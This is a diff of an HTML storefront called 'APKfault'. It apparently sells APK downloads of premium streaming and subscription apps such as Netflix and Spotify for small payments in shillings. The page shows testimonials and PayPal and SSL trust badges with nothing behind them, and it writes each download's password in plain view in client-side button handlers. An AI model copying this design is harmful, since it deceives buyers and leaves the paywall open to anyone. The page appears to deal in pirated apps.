@@ -8,32 +8,36 @@
         body {
             margin: 0;
             padding: 0;
-            font-family: Arial, sans-serif;
+            font-family: 'Segoe UI', Arial, sans-serif;
+            line-height: 1.6;
         }
         .banner {
             position: fixed;
             bottom: 0;
             width: 100%;
-            background: linear-gradient(to right, #000428, #004e92);
+            background: linear-gradient(135deg, #000428 0%, #004e92 100%);
             color: white;
             text-align: center;
-            padding: 0px;
+            padding: 10px 0;
             display: flex;
             align-items: center;
             justify-content: space-around;
+            z-index: 1000;
+            box-shadow: 0 -2px 10px rgba(0,0,0,0.2);
         }
         .banner img {
             width: 100px;
             height: 60px;
-            border-radius: 0px;
-            transition: transform 0.3s;
+            object-fit: contain;
+            transition: transform 0.3s ease;
         }
         .banner img:hover {
             transform: scale(1.1);
         }
         .banner h2 {
-            margin: 0;
+            margin: 0 15px;
             animation: fadeIn 2s infinite alternate;
+            font-size: 1.2rem;
         }
         .cta-button {
             background: #ff9800;
@@ -43,46 +47,67 @@
             cursor: pointer;
             font-size: 16px;
             border-radius: 5px;
-            transition: background 0.3s;
+            transition: all 0.3s ease;
+            font-weight: bold;
         }
         .cta-button:hover {
             background: #e68900;
+            transform: translateY(-2px);
+            box-shadow: 0 4px 8px rgba(0,0,0,0.2);
         }
         @keyframes fadeIn {
             from { opacity: 0.6; }
             to { opacity: 1; }
+        }
+        .game-images {
+            display: flex;
+            gap: 15px;
+        }
+        
+        /* Responsive adjustments */
+        @media (max-width: 768px) {
+            .banner {
+                flex-direction: column;
+                padding: 10px;
+            }
+            .banner h2 {
+                margin: 10px 0;
+                font-size: 1rem;
+            }
+            .game-images {
+                margin-bottom: 10px;
+            }
+            .banner img {
+                width: 80px;
+                height: 50px;
+            }
         }
     </style>
 </head>
 <body>
     <div class="banner">
         <div class="game-images">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/4/40/Counter-Strike_1.6_logo.png" alt="Counter-Strike">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/5/57/Grand_Theft_Auto_V_logo.svg" alt="GTA V">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/9/9c/Call_of_Duty_Warzone_logo.png" alt="Call of Duty Warzone">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/4/40/Counter-Strike_1.6_logo.png" alt="Counter-Strike" loading="lazy">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/5/57/Grand_Theft_Auto_V_logo.svg" alt="GTA V" loading="lazy">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/9/9c/Call_of_Duty_Warzone_logo.png" alt="Call of Duty Warzone" loading="lazy">
         </div>
         <h2>🔥 PC GAMES COMING SOON! 🔥</h2>
         <button class="cta-button" onclick="alert('We will notify you when they are available')">Stay Updated</button>
     </div>
-</body>
-</html>
 
+    <!-- Desktop View Warning Modal -->
+    <div id="desktopWarning" class="modal">
+        <div class="modal-content">
+            <span class="close" onclick="closeWarning()">&times;</span>
+            <div class="warning-icon">⚠️</div>
+            <div class="message">
+                For the <strong>best experience</strong>, please switch to <strong>Desktop Mode</strong> on your browser.
+            </div>
+            <a href="#" class="desktop-mode-btn" onclick="showHowTo()">How to Enable Desktop Mode</a>
+        </div>
+    </div>
 
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Best Viewed in Desktop Mode</title>
     <style>
-        body {
-            font-family: Arial, sans-serif;
-            background-color: #f4f4f4;
-            text-align: center;
-            margin: 0;
-            padding: 0;
-        }
-
         /* Modal Styling */
         .modal {
             display: none;
@@ -92,1498 +117,1336 @@
             top: 0;
             width: 100%;
             height: 100%;
-            background-color: rgba(0, 0, 0, 0.5);
+            background-color: rgba(0, 0, 0, 0.7);
+            backdrop-filter: blur(3px);
         }
-
         .modal-content {
             background: white;
             width: 90%;
             max-width: 400px;
             margin: 15% auto;
-            padding: 20px;
-            border-radius: 10px;
+            padding: 25px;
+            border-radius: 12px;
             text-align: center;
             position: relative;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.3);
+            animation: modalFadeIn 0.3s ease-out;
         }
-
-        /* Close Button */
+        @keyframes modalFadeIn {
+            from { opacity: 0; transform: translateY(-20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
         .close {
             position: absolute;
             top: 10px;
             right: 15px;
-            font-size: 22px;
+            font-size: 24px;
             cursor: pointer;
+            transition: color 0.2s;
         }
-
+        .close:hover {
+            color: #ff0000;
+        }
         .warning-icon {
             font-size: 40px;
             color: #ffcc00;
+            margin-bottom: 15px;
         }
-
         .message {
             font-size: 18px;
             color: #333;
-            margin-top: 10px;
+            margin: 15px 0;
+            line-height: 1.5;
         }
-
         .desktop-mode-btn {
             display: inline-block;
-            padding: 10px 15px;
+            padding: 12px 20px;
             font-size: 16px;
             color: white;
             background-color: #007bff;
             text-decoration: none;
-            border-radius: 5px;
+            border-radius: 6px;
             margin-top: 15px;
+            transition: all 0.3s ease;
         }
-
         .desktop-mode-btn:hover {
             background-color: #0056b3;
+            transform: translateY(-2px);
+            box-shadow: 0 4px 8px rgba(0,0,0,0.2);
         }
     </style>
-</head>
-<body>
-
-<!-- Desktop View Warning Modal -->
-<div id="desktopWarning" class="modal">
-    <div class="modal-content">
-        <span class="close" onclick="closeWarning()">&times;</span>
-        <div class="warning-icon">⚠️</div>
-        <div class="message">
-            For the <strong>best experience</strong>, please switch to <strong>Desktop Mode</strong> on your browser.
-        </div>
-        <a href="#" class="desktop-mode-btn" onclick="showHowTo()">How to Enable Desktop Mode</a>
-    </div>
-</div>
-
-<script>
-    function isMobileDevice() {
-        if (navigator.userAgentData && navigator.userAgentData.mobile) {
-            return true;
-        }
-        return /Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
-    }
-
-    function isDesktopView() {
-        return window.innerWidth > 1024; // More accurate breakpoint
-    }
-
-    function showWarning() {
-        if (isMobileDevice() && !isDesktopView()) {
-            document.getElementById("desktopWarning").style.display = "block";
-        }
-    }
-
-    function closeWarning() {
-        document.getElementById("desktopWarning").style.display = "none";
-    }
-
-    function showHowTo() {
-        alert("To enable Desktop Mode: \n\n- On Chrome (Android): Tap the three dots (⋮) > 'Desktop site'. \n- On Safari (iPhone): Tap 'AA' in the URL bar > 'Request Desktop Website'.");
-    }
-
-    // Run after DOM has fully loaded
-    document.addEventListener("DOMContentLoaded", showWarning);
-</script>
-
-</body>
-</html>
-
-
-
-
-
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta name="description" content="Request and download APKs after payment.">
-    <title>2025. All Rights reserved</title>
-    <link rel="manifest" href="/manifest.json">
-    <style>
-    body {
-        font-family: Arial, sans-serif;
-        background-color: #cccccc;
-        margin: 0;
-        padding: 0;
-        transition: background-color 0.5s, color 0.5s;
-    }
-
-    body.dark-mode {
-        background-color: #121212;
-        color: white;
-    }
-
-    header {
-        background-color: #333;
-        color: white;
-        padding: o.1px 0;
-        text-align: center;
-    }
-
-    header h1 {
-        font-size: 2vw;
-    }
-
-    .app-list {
-        display: grid;
-        grid-template-columns: repeat(auto-fill, minmax(220px, 1fr));
-        grid-gap: 10px;
-        padding: 2px;
-    }
-
-    /* Media Queries for responsiveness */
-    @media (max-width: 768px) {
-        header h1 {
-            font-size: 6vw;
-        }
-        .app-list {
-            padding: 15px;
-            grid-template-columns: repeat(auto-fill, minmax(180px, 1fr)); /* Smaller grid items for tablets */
-        }
-        .app-item {
-            width: 45%;
-            margin: 1px;
-        }
-        .price {
-            font-size: 1.2rem;
-        }
-        .cta-button {
-            font-size: 1rem;
-        }
-    }
-
-    @media (max-width: 480px) {
-        header h1 {
-            font-size: 8vw;
-        }
-        .app-list {
-            padding: 10px;
-            grid-template-columns: repeat(auto-fill, minmax(150px, 1fr)); /* Even smaller grid items for mobile */
-        }
-        .app-item {
-            width: 90%;
-        }
-        .form-container {
-            max-width: 100%;
-        }
-        .cta-button {
-            font-size: 1rem;
-        }
-    }
-
-    .app-item {
-        background-color: #f9f9f9;
-        padding: 20px;
-        width: 220px;
-        border-radius: 12px;
-        box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
-        text-align: center;
-        transition: transform 0.3s ease-in-out, box-shadow 0.3s ease-in-out;
-        margin: 1px;
-    }
-
-    .app-item:hover {
-        transform: translateY(-10px);
-        box-shadow: 0 8px 16px rgba(0, 0, 0, 0.2);
-        background-color: rgba(0, 0, 0, 0.4);
-    }
-
-    .app-item h3 {
-        font-size: 1.2rem;
-    }
-
-    .price {
-        font-size: 1.5rem;
-        color: #007bff;
-        font-weight: bold;
-    }
-
-    .cta-button {
-        background-color: #007bff;
-        color: white;
-        border: none;
-        padding: 10px;
-        cursor: pointer;
-        border-radius: 5px;
-    }
-
-    .cta-button:hover {
-        background-color: #0056b3;
-    }
-
-    .form-container {
-        padding: 20px;
-        background: #f9f9f9;
-        margin-top: 20px;
-        box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
-        border-radius: 8px;
-        max-width: 90%;
-        margin-left: auto;
-        margin-right: auto;
-    }
-
-    .form-container input, .form-container textarea {
-        width: 100%;
-        padding: 10px;
-        margin: 10px 0;
-        border-radius: 5px;
-        border: 1px solid #ccc;
-    }
-
-    .form-container button {
-        width: 100%;
-        padding: 12px;
-        background-color: #28a745;
-        color: white;
-        border: none;
-        cursor: pointer;
-        border-radius: 5px;
-    }
-
-    .form-container button:hover {
-        background-color: #218838;
-    }
-
-    .footer {
-        text-align: center;
-        padding: 0.2px;
-        background-color: #333;
-        color: white;
-    }
-
-    .vault-container {
-        display: none;
-        margin-top: 40px;
-        text-align: center;
-    }
-
-    .vault-container input {
-        width: 300px;
-        margin: 10px 0;
-    }
-
-    .vault-container button {
-        padding: 10px 20px;
-        background-color: #007bff;
-        color: white;
-        border: none;
-        cursor: pointer;
-        border-radius: 5px;
-    }
-
-    .vault-container button:hover {
-        background-color: #0056b3;
-    }
-
-    #countdown {
-        color: red;
-        font-weight: bold;
-    }
-</style>
-
-
-</head>
-<body>
-
-<header>
-    <h1>APKfault</h1>
-    
-
-
-
-
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Apple App Store Button</title>
-    <style>
-        .appstore-button {
-            display: flex;
-            align-items: center;
-            background-color: #000;
-            color: white;
-            font-size: 16px;
-            font-family: Arial, sans-serif;
-            border: none;
-            padding: 10px 15px;
-            border-radius: 8px;
-            cursor: pointer;
-            text-decoration: none;
-            width: fit-content;
-        }
-
-        .appstore-button img {
-            width: 24px;
-            height: 24px;
-            margin-right: 10px;
-        }
-
-        .appstore-button:hover {
-            background-color: #333;
-        }
-    </style>
-</head>
-<body>
-
-    <a href="https://www.apple.com/app-store/" target="_blank" class="appstore-button">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/6/67/App_Store_%28iOS%29.svg" alt="App Store">
-        Open Apple App Store
-    </a>
-
-</body>
-</html>
-
-
-
-
-
-
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Google Play Button</title>
-    <style>
-        .playstore-button {
-            display: flex;
-            align-items: center;
-            background-color: #00A4EF;
-            color: white;
-            font-size: 16px;
-            font-family: Arial, sans-serif;
-            border: none;
-            padding: 10px 15px;
-            border-radius: 8px;
-            cursor: pointer;
-            text-decoration: none;
-            width: fit-content;
-        }
-
-        .playstore-button img {
-            width: 24px;
-            height: 24px;
-            margin-right: 10px;
-        }
-
-        .playstore-button:hover {
-            background-color: #008CC9;
-        }
-    </style>
-</head>
-<body>
-
-    <a href="https://play.google.com/store" target="_blank" class="playstore-button">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/7/78/Google_Play_Store_badge_EN.svg" alt="Play Store">
-        Open Google Play Store
-    </a>
-
-</body>
-</html>
-
-
-
-
-
-
-
-
-
-
-
-    <!-- Button to switch to Desktop View -->
-
-
-    <script src="swdesktop.js"></script>    
-</body>
-</html>
-</header
-
-<section id="app-list">
-    <h2 style="text-align: center; margin-top: 40px;">Available Apps</h2>
-    <div class="app-list">
-
-
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Snaptchat Gold</title>
-   <style>
-    body {
-        font-family: Arial, sans-serif;
-        text-align: center;
-        margin-top: 50px;
-        background-color: #f4f4f4;
-    }
-    .container {
-        padding: 20px;
-        background-color: rgba(0,0,0,0.4);
-        border-radius: 10px;
-        box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
-        display: inline-block;
-        max-width: 120%;
-        margin-left: auto;
-        margin-right: auto;
-    }
-    .description {
-        font-size: 1.2rem;
-        margin-bottom: 20px;
-        color: #333;
-    }
-    .download-button {
-        display: inline-block;
-        padding: 10px 20px;
-        font-size: 1.2rem;
-        color: white;
-        background-color: #007bff;
-        text-decoration: none;
-        border-radius: 5px;
-        box-shadow: 0 4px 6px rgba(0, 123, 255, 0.4);
-        transition: background-color 0.3s, box-shadow 0.3s;
-    }
-    .download-button:hover {
-        background-color: #0056b3;
-        background-color: rgba(0,0,0,0.4);
-        box-shadow: 0 6px 8px rgba(0, 86, 179, 0.4);
-    }
-    .video-container {
-        margin-top: 20px;
-    }
-    video {
-        width: 50%;
-        max-width: 800px;
-        height: auto;
-        border-radius: 10px;
-    }
-    .timer {
-        font-size: 2rem;
-        font-weight: bold;
-        color: #007bff;
-        margin-top: 20px;
-    }
-
-    /* Media Queries for responsiveness */
-    @media (max-width: 768px) {
-        .container {
-            padding: 15px;
-        }
-        .description {
-            font-size: 1.1rem;
-        }
-        .download-button {
-            font-size: 1rem;
-            padding: 8px 16px;
-        }
-        .timer {
-            font-size: 1.8rem;
-        }
-    }
-
-    @media (max-width: 480px) {
-        .container {
-            padding: 10px;
-        }
-        .description {
-            font-size: 1rem;
-        }
-        .download-button {
-            font-size: 1rem;
-            padding: 8px 16px;
-        }
-        .timer {
-            font-size: 1.6rem;
-        }
-    }
-</style>
-
-
-
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Console Popup</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            text-align: center;
-            margin-top: 50px;
-        }
-
-        button {
-            background-color: #333;
-            color: white;
-            border: none;
-            padding: 10px 20px;
-            font-size: 16px;
-            cursor: pointer;
-            border-radius: 5px;
-        }
-
-        button:hover {
-            background-color: #555;
-        }
-    </style>
-</head>
-<body>
-    <button id="openConsole">WB Notes</button>
 
     <script>
-        document.getElementById("openConsole").addEventListener("click", function() {
-            let isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
-            if (isMobile) {
-                // Open in a new tab for mobile
-                window.open("http://en1.lovestoblog.com/", "_blank", "noopener,noreferrer");
-            } else {
-                // Open small popup for desktop
-                let popup = window.open("http://en1.lovestoblog.com/", "ConsoleWindow", "width=400,height=300");
-                if (!popup) {
-                    alert("Popup blocked! Please allow popups for this site.");
-                }
+        function isMobileDevice() {
+            if (navigator.userAgentData && navigator.userAgentData.mobile) {
+                return true;
             }
+            return /Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
+        }
+
+        function isDesktopView() {
+            return window.innerWidth > 1024;
+        }
+
+        function showWarning() {
+            if (isMobileDevice() && !isDesktopView()) {
+                document.getElementById("desktopWarning").style.display = "block";
+            }
+        }
+
+        function closeWarning() {
+            document.getElementById("desktopWarning").style.display = "none";
+        }
+
+        function showHowTo() {
+            alert("To enable Desktop Mode: \n\n- On Chrome (Android): Tap the three dots (⋮) > 'Desktop site'. \n- On Safari (iPhone): Tap 'AA' in the URL bar > 'Request Desktop Website'.");
+        }
+
+        document.addEventListener("DOMContentLoaded", function() {
+            showWarning();
+            // Close modal when clicking outside content
+            document.getElementById("desktopWarning").addEventListener("click", function(e) {
+                if (e.target === this) {
+                    closeWarning();
+                }
+            });
         });
     </script>
-</body>
-</html>
 
+    <main>
+        <div class="container">
+            <header>
+                <h1>APKfault</h1>
+                
+                <div class="store-buttons">
+                    <a href="https://www.apple.com/app-store/" target="_blank" class="appstore-button">
+                        <img src="https://upload.wikimedia.org/wikipedia/commons/6/67/App_Store_%28iOS%29.svg" alt="App Store" loading="lazy">
+                        Open Apple App Store
+                    </a>
+                    
+                    <a href="https://play.google.com/store" target="_blank" class="playstore-button">
+                        <img src="https://upload.wikimedia.org/wikipedia/commons/7/78/Google_Play_Store_badge_EN.svg" alt="Play Store" loading="lazy">
+                        Open Google Play Store
+                    </a>
+                </div>
+            </header>
 
+            <style>
+                .store-buttons {
+                    display: flex;
+                    gap: 15px;
+                    justify-content: center;
+                    margin: 20px 0;
+                    flex-wrap: wrap;
+                }
+                .appstore-button {
+                    display: flex;
+                    align-items: center;
+                    background-color: #000;
+                    color: white;
+                    font-size: 16px;
+                    font-family: Arial, sans-serif;
+                    border: none;
+                    padding: 12px 20px;
+                    border-radius: 8px;
+                    cursor: pointer;
+                    text-decoration: none;
+                    width: fit-content;
+                    transition: all 0.3s ease;
+                }
+                .appstore-button:hover {
+                    background-color: #333;
+                    transform: translateY(-2px);
+                    box-shadow: 0 4px 8px rgba(0,0,0,0.2);
+                }
+                .appstore-button img {
+                    width: 24px;
+                    height: 24px;
+                    margin-right: 10px;
+                }
+                .playstore-button {
+                    display: flex;
+                    align-items: center;
+                    background-color: #00A4EF;
+                    color: white;
+                    font-size: 16px;
+                    font-family: Arial, sans-serif;
+                    border: none;
+                    padding: 12px 20px;
+                    border-radius: 8px;
+                    cursor: pointer;
+                    text-decoration: none;
+                    width: fit-content;
+                    transition: all 0.3s ease;
+                }
+                .playstore-button:hover {
+                    background-color: #008CC9;
+                    transform: translateY(-2px);
+                    box-shadow: 0 4px 8px rgba(0,0,0,0.2);
+                }
+                .playstore-button img {
+                    width: 24px;
+                    height: 24px;
+                    margin-right: 10px;
+                }
+            </style>
 
+            <section id="app-list">
+                <h2 style="text-align: center; margin: 40px 0 30px; font-size: 2rem; color: #333;">Available Apps</h2>
+                <div class="app-list">
 
+                    <!-- App 1 -->
+                    <div class="app-item">
+                        <h3>App 1: Trello Task Manager</h3>
+                        <div class="app-info">
+                            <img src="IMAGES/TaskManager.jpg" alt="Task Manager app image" class="app-image" loading="lazy">
+                            <div class="badges">
+                                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b5/PayPal.svg/1200px-PayPal.svg.png" alt="PayPal" class="payment-logo" loading="lazy">
+                                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a7/SSL_Logo.svg/1200px-SSL_Logo.svg.png" alt="SSL Secured" class="ssl-logo" loading="lazy">
+                            </div>
+                        </div>
+                        <p>Organize your tasks and improve productivity with an intuitive and easy-to-use task manager.</p>
+                        <p class="price">Ksh 150</p>
+                        <button class="cta-button" onclick="openRequestForm('Task Manager', 'PASSWORD123', 'task_manager.apk')">Buy Now</button>
 
-<!-- App 1 -->
-<div class="app-item">
-    <h3>App 1: Trello Task Manager</h3>
-    <div class="app-info">
-        <img src="IMAGES/TaskManager.jpg" alt="Task Manager app image" class="app-image">
-        <div class="badges">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b5/PayPal.svg/1200px-PayPal.svg.png" alt="PayPal" class="payment-logo">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a7/SSL_Logo.svg/1200px-SSL_Logo.svg.png" alt="SSL Secured" class="ssl-logo">
+                        <button class="expand-button" onclick="toggleDemo('demo-task-manager')">Show Demo</button>
+                        <div id="demo-task-manager" class="app-demo" style="display: none;">
+                            <h4>App Demonstration</h4>
+                            <div class="video-container">
+                                <iframe width="560" height="315" src="https://www.youtube.com/embed/t0-rGmd7G6A?si=Rg0AtumGllQJsj93" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen loading="lazy"></iframe>
+                            </div>
+                            <div class="testimonials">
+                                <h4>What Users Are Saying:</h4>
+                                <p>"This app completely changed the way I organize my tasks. It's super simple and keeps me on track!" — John D.</p>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- App 2 -->
+                    <div class="app-item">
+                        <h3>App 2: Fitness Tracker</h3>
+                        <div class="app-info">
+                            <img src="IMAGES/FitnessTracker.jpg" alt="Fitness Tracker app image" class="app-image" loading="lazy">
+                            <div class="badges">
+                                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b5/PayPal.svg/1200px-PayPal.svg.png" alt="PayPal" class="payment-logo" loading="lazy">
+                                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a7/SSL_Logo.svg/1200px-SSL_Logo.svg.png" alt="SSL Secured" class="ssl-logo" loading="lazy">
+                            </div>
+                        </div>
+                        <p>Track your workouts and health progress with personalized goals and insights.</p>
+                        <p class="price">Ksh 200</p>
+                        <button class="cta-button" onclick="openRequestForm('Fitness Tracker', 'PASSWORD456', 'fitness_tracker.apk')">Buy Now</button>
+
+                        <button class="expand-button" onclick="toggleDemo('demo-fitness-tracker')">Show Demo</button>
+                        <div id="demo-fitness-tracker" class="app-demo" style="display: none;">
+                            <h4>App Demonstration</h4>
+                            <div class="video-container">
+                                <iframe width="560" height="315" src="https://www.youtube.com/embed/JddrzXA08-U?si=Ov5zOe0GrouaRQbA" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen loading="lazy"></iframe>
+                            </div>
+                            <div class="testimonials">
+                                <h4>What Users Are Saying:</h4>
+                                <p>"I love how it tracks my progress and motivates me to work out harder each day. Highly recommend!" — Sarah P.</p>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- App 3 -->
+                    <div class="app-item">
+                        <h3>App 3: Peacock Premium</h3>
+                        <div class="app-info">
+                            <img src="IMAGES/PeacockPremium.jpg" alt="Peacock Premium app image" class="app-image" loading="lazy">
+                            <div class="badges">
+                                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b5/PayPal.svg/1200px-PayPal.svg.png" alt="PayPal" class="payment-logo" loading="lazy">
+                                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a7/SSL_Logo.svg/1200px-SSL_Logo.svg.png" alt="SSL Secured" class="ssl-logo" loading="lazy">
+                            </div>
+                        </div>
+                        <p>Stream your favorite shows, movies, and live sports ad-free with exclusive content from NBCUniversal.</p>
+                        <p class="price">Ksh 250</p>
+                        <button class="cta-button" onclick="openRequestForm('Peacock Premium', 'PEACOCK456', 'Peacock_Premium.apk')">Buy Now</button>
+
+                        <button class="expand-button" onclick="toggleDemo('demo-peacock-premium')">Show Demo</button>
+                        <div id="demo-peacock-premium" class="app-demo" style="display: none;">
+                            <h4>App Demonstration</h4>
+                            <div class="video-container">
+                                <iframe width="560" height="315" src="https://www.youtube.com/embed/xZ5J2E_43wY?si=594Sv4Fgr4h0l2EB" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen loading="lazy"></iframe>
+                            </div>
+                            <div class="testimonials">
+                                <h4>What Users Are Saying:</h4>
+                                <p>"I never miss my favorite NBC shows! The stream quality is excellent, and the content selection is unbeatable!" — Mark S.</p>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- App 4 -->
+                    <div class="app-item">
+                        <h3>App 4: Netflix Premium</h3>
+                        <div class="app-info">
+                            <img src="IMAGES/NetflixPremium.jpg" alt="Netflix Premium app image" class="app-image" loading="lazy">
+                            <div class="badges">
+                                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b5/PayPal.svg/1200px-PayPal.svg.png" alt="PayPal" class="payment-logo" loading="lazy">
+                                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a7/SSL_Logo.svg/1200px-SSL_Logo.svg.png" alt="SSL Secured" class="ssl-logo" loading="lazy">
+                            </div>
+                        </div>
+                        <p>Access Netflix's full library of movies, TV shows, and originals in 4K, ad-free, on up to 4 devices.</p>
+                        <p class="price">Ksh 300</p>
+                        <button class="cta-button" onclick="openRequestForm('Netflix Premium', 'PASSWORD0000456', 'Netflix_Premium.apk')">Buy Now</button>
+
+                        <button class="expand-button" onclick="toggleDemo('demo-netflix-premium')">Show Demo</button>
+                        <div id="demo-netflix-premium" class="app-demo" style="display: none;">
+                            <h4>App Demonstration</h4>
+                            <div class="video-container">
+                                <iframe width="560" height="315" src="https://www.youtube.com/embed/C7oXIxZvUGQ?si=7dsXdKvVkIATw9g8" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen loading="lazy"></iframe>
+                            </div>
+                            <div class="testimonials">
+                                <h4>What Users Are Saying:</h4>
+                                <p>"Best streaming experience ever! Netflix Premium lets me watch everything I love in 4K. Worth every penny!" — Jessica T.</p>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- App 5 -->
+                    <div class="app-item">
+                        <h3>App 5: Truecaller Gold</h3>
+                        <div class="app-info">
+                            <img src="IMAGES/TruecallerGold.jpg" alt="Truecaller Gold app image" class="app-image" loading="lazy">
+                            <div class="badges">
+                                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b5/PayPal.svg/1200px-PayPal.svg.png" alt="PayPal" class="payment-logo" loading="lazy">
+                                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a7/SSL_Logo.svg/1200px-SSL_Logo.svg.png" alt="SSL Secured" class="ssl-logo" loading="lazy">
+                            </div>
+                        </div>
+                        <p>Block spam calls, customize your caller ID, and access priority support with Truecaller Gold.</p>
+                        <p class="price">Ksh 180</p>
+                        
+                        <div class="button-container">
+                            <button class="cta-button" onclick="openRequestForm('Truecaller Gold', 'PASSWORD456', 'Truecaller_Gold.apk')">Buy Now</button>
+                            <button class="expand-btn" onclick="toggleDemo('demo5')">Show Demo</button>
+                        </div>
+
+                        <div id="demo5" class="demo-content" style="display: none;">
+                            <div class="video-container">
+                                <iframe width="560" height="315" src="https://www.youtube.com/embed/kleqKndSsO0?si=BriKlQ2g72BqiiNd" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen loading="lazy"></iframe>
+                            </div>
+                            <div class="testimonials">
+                                <h4>What Users Are Saying:</h4>
+                                <p>"Truecaller Gold has made managing my calls so much easier! I no longer get spam calls. A must-have!" — Emily W.</p>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- App 6 -->
+                    <div class="app-item">
+                        <h3>App 6: Spotify Premium</h3>
+                        <div class="app-info">
+                            <img src="IMAGES/SpotifyPremium.jpg" alt="Spotify Premium app image" class="app-image" loading="lazy">
+                            <div class="badges">
+                                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b5/PayPal.svg/1200px-PayPal.svg.png" alt="PayPal" class="payment-logo" loading="lazy">
+                                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a7/SSL_Logo.svg/1200px-SSL_Logo.svg.png" alt="SSL Secured" class="ssl-logo" loading="lazy">
+                            </div>
+                        </div>
+                        <p>Enjoy ad-free music, offline listening, unlimited skips, and high-quality audio with Spotify Premium.</p>
+                        <p class="price">Ksh 250</p>
+                        
+                        <div class="button-container">
+                            <button class="cta-button" onclick="openRequestForm('Spotify Premium', 'PASSWORD456premium', 'Spotify_Premium.apk')">Buy Now</button>
+                            <button class="expand-btn" onclick="toggleDemo('demo6')">Show Demo</button>
+                        </div>
+
+                        <div id="demo6" class="demo-content" style="display: none;">
+                            <div class="video-container">
+                                <iframe width="560" height="315" src="https://www.youtube.com/embed/eH8t7ZQQaNg?si=lUz-eiYwQlSBDqXJ" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen loading="lazy"></iframe>
+                            </div>
+                            <div class="testimonials">
+                                <h4>What Users Are Saying:</h4>
+                                <p>"Spotify Premium transformed my music experience. I can listen without interruptions and offline too!" — Michael B.</p>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- App 7 -->
+                    <div class="app-item">
+                        <h3>App 7: YouTube Premium</h3>
+                        <div class="app-info">
+                            <img src="IMAGES/YouTubePremium.jpg" alt="YouTube Premium app image" class="app-image" loading="lazy">
+                            <div class="badges">
+                                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b5/PayPal.svg/1200px-PayPal.svg.png" alt="PayPal" class="payment-logo" loading="lazy">
+                                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a7/SSL_Logo.svg/1200px-SSL_Logo.svg.png" alt="SSL Secured" class="ssl-logo" loading="lazy">
+                            </div>
+                        </div>
+                        <p>Watch ad-free videos, enjoy offline playback, and stream YouTube Music with YouTube Premium.</p>
+                        <p class="price">Ksh 200</p>
+                        
+                        <div class="button-container">
+                            <button class="cta-button" onclick="openRequestForm('YouTube Premium', 'PASSyoupWORD456', 'YouTube_Premium.apk')">Buy Now</button>
+                            <button class="expand-btn" onclick="toggleDemo('demo7')">Show Demo</button>
+                        </div>
+
+                        <div id="demo7" class="demo-content" style="display: none;">
+                            <div class="video-container">
